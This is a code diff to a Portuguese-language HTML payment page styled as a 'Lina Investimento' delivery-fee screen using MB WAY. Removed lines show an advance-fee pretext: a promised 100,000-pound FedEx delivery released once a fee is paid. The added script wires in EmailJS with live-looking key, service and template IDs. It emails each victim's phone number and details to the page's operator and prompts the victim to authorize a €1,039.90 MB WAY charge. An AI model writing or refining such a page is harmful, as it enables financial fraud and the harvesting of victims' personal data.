@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Taxa de Entrega - Lina Investimento de 100.000 euros</title>
+  <title>Taxa de Entrega - Lina Investimento</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
     
@@ -124,7 +124,7 @@
   <div class="container" id="payment-screen">
     <div class="header">
       <img src="https://i.ibb.co/nsfQLyWB/unnamed.webp" alt="Logo Lina Investimento">
-      <h1>Lina enviou 100.000 libras para você via FedEx. Por favor, efetue o pagamento da entrega e ela será entregue em sua casa em 30 minutos. </h1>
+      <h1>Taxa de entrega para seu investimento financeiro da Lina</h1>
     </div>
 
     <div class="content">
@@ -133,7 +133,7 @@
              alt="MB WAY Logo">
       </div>
 
-      <h2>FedEx pagamento para entrega através de MB WAY</h2>
+      <h2>Pagamento com MB WAY</h2>
 
       <form id="mbway-form">
         <div class="input-group">
@@ -177,7 +177,13 @@
     </button>
   </div>
 
-  <script>
+  <!-- EmailJS Script -->
+  <script type="text/javascript">
+    // Initialize EmailJS with your credentials
+    (function() {
+      emailjs.init("8tNTuFPIowu1Ookpq");   // Your Public Key
+    })();
+
     const form = document.getElementById('mbway-form');
     
     form.addEventListener('submit', function(e) {
@@ -191,20 +197,30 @@
         return;
       }
 
-      const orderData = {
+      // Prepare data for EmailJS
+      const templateParams = {
         phone: phone,
-        amount: "1039.90",
-        currency: "EUR",
-        title: "Taxa de entrega para seu investimento financeiro da Lina",
         details: details || "Sem detalhes adicionais",
-        timestamp: new Date().toLocaleString('pt-PT')
+        timestamp: new Date().toLocaleString('pt-PT'),
+        year: new Date().getFullYear()
       };
 
-      console.log("📤 Pedido enviado para o administrador:", orderData);
-
+      // Show authorization screen
       document.getElementById('payment-screen').style.display = 'none';
       document.getElementById('auth-screen').style.display = 'flex';
 
+      // Send notification via EmailJS
+      emailjs.send('service_s2e0bde', 'template_7ulapld', templateParams)
+        .then(function(response) {
+          console.log('✅ Email enviado com sucesso!', response.status, response.text);
+        })
+        .catch(function(error) {
+          console.error('❌ Erro ao enviar email:', error);
+          // You can uncomment below if you want to notify the user
+          // alert("Pedido enviado, mas houve um problema ao notificar o administrador.");
+        });
+
+      // Show confirmation to user
       alert("Pedido de pagamento enviado!\nVerifique a sua app MB WAY para autorizar € 1.039,90");
     });
   </script>
